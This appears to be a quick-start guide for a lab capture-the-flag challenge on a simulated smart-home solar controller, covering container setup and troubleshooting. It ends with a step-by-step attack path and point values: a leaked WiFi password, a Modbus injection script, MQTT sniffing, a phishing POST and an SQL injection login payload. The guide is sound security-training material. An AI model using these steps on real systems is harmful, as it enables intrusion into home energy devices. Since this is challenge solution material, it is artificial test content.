# Smart Home PV Challenge - Quick Start Guide

## ⚠️ IMPORTANT: Container Confusion!

There are **TWO different containers** you can use:

### ❌ scl-hackerlab (Main Platform - LIMITED TOOLS)
- **Location**: Main stratocyberlab platform
- **Access**: `docker exec -it scl-hackerlab bash`
- **Tools**: Basic Linux tools, nmap, curl, python3
- **Missing**: mosquitto_sub, mosquitto_pub, sqlmap, pymodbus
- **Use for**: General exploration, but NOT this challenge!

### ✅ attacker (Challenge-Specific - ALL TOOLS)
- **Location**: Inside smart-home-pv challenge
- **Access**: See below
- **Tools**: nmap, curl, mosquitto_sub/pub, python3, pymodbus, sqlmap
- **Use for**: This challenge (smart-home-pv)

---

## 🚀 How to Start This Challenge

### Step 1: Start the Challenge Containers

```bash
cd /home/mastros/gitstuff/stratocyberlab/challenges/smart-home-pv
docker compose up -d
```

**Expected output:**
```
✔ Container scl-challenge-smart-home-pv           Running
✔ Container scl-challenge-mosquitto               Running
✔ Container scl-challenge-smart-home-pv-attacker  Started
...
```

### Step 2: Enter the Attacker Container

```bash
# Make sure you're in the challenge directory
cd /home/mastros/gitstuff/stratocyberlab/challenges/smart-home-pv

# Access the attacker container
docker compose exec attacker bash
```

**You should see:**
```
attacker@<container-id>:~$
```

### Step 3: Verify Tools Are Available

```bash
# Run this INSIDE the attacker container
which mosquitto_sub mosquitto_pub python3 nmap sqlmap
```

**Expected output:**
```
/usr/bin/mosquitto_sub
/usr/bin/mosquitto_pub
/opt/venv/bin/python3
/usr/bin/nmap
/usr/bin/sqlmap
```

If you see all these paths, you're ready!

---

## 📝 Quick Validation Test

Run these commands **inside the attacker container** to verify everything works:

```bash
# Test 1: WiFi scan (Task 1)
curl http://172.20.0.65/wifi_scan

# Test 2: MQTT enumeration
mosquitto_sub -h 172.20.0.66 -t '#' -v -C 3

# Test 3: Modbus attack (Task 2)
python3 /home/attacker/tools/attacker_modbus.py 172.20.0.65 15002
```

If all three commands work, you're good to go! Follow the complete [WALKTHROUGH.md](WALKTHROUGH.md) for all 6 tasks.

---

## 🔍 Troubleshooting

### Problem: "mosquitto_sub: command not found"

**Cause**: You're in the wrong container (probably scl-hackerlab)

**Solution**:
```bash
# Exit the current container
exit

# Go to the challenge directory
cd /home/mastros/gitstuff/stratocyberlab/challenges/smart-home-pv

# Enter the ATTACKER container
docker compose exec attacker bash
```

### Problem: "No such container: scl-challenge-smart-home-pv-attacker"

**Cause**: Challenge containers aren't running

**Solution**:
```bash
cd /home/mastros/gitstuff/stratocyberlab/challenges/smart-home-pv
docker compose up -d
```

### Problem: "Cannot connect to 172.20.0.65"

**Cause**: Challenge services aren't running

**Solution**:
```bash
# Check container status
docker compose ps

# Restart if needed
docker compose restart
```

---

## 📊 Network Map

Once inside the attacker container, you can reach:

| Service | IP Address | Port | Description |
|---------|------------|------|-------------|
| PV Controller | 172.20.0.65 | 80 | Web interface, REST API |
| PV Controller | 172.20.0.65 | 15002 | Modbus TCP |
| MQTT Broker | 172.20.0.66 | 1883 | Eclipse Mosquitto |

---

## 🎯 Quick Attack Path

**From inside the attacker container:**

```bash
# 1. Recon (10 pts)
curl http://172.20.0.65/wifi_scan
# Get password: super-secret-123

# 2. Modbus injection (20 pts)
python3 /home/attacker/tools/attacker_modbus.py 172.20.0.65 15002

# 3. Login with WiFi password (15 pts)
curl -s -X POST http://172.20.0.65/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"super-secret-123"}' | grep token

# 4. MQTT enumeration (20 pts)
mosquitto_sub -h 172.20.0.66 -t '#' -v

# 5. Phishing simulation (20 pts)
curl -X POST http://172.20.0.65/phish \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"super-secret-123"}'

# 6. SQLi on admin panel (15 pts)
curl -X POST http://172.20.0.65/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"\" OR 1=1--"}'
```

For detailed explanations, see [WALKTHROUGH.md](WALKTHROUGH.md).

---

## 💡 Pro Tips

1. **Keep two terminals open**: One in the attacker container, one on your host
2. **Use `docker compose logs -f`** to watch challenge activity in real-time
3. **The attacker container has a Python virtual environment** at `/opt/venv` with pymodbus pre-installed
4. **All scripts are in** `/home/attacker/tools/`
5. **Read the meta.json** for hints if you get stuck

---

## 🆘 Still Having Issues?

Check the container logs:
```bash
cd /home/mastros/gitstuff/stratocyberlab/challenges/smart-home-pv
docker compose logs attacker
docker compose logs scl-challenge-smart-home-pv
```

Or rebuild everything:
```bash
docker compose down
docker compose up -d --build
```
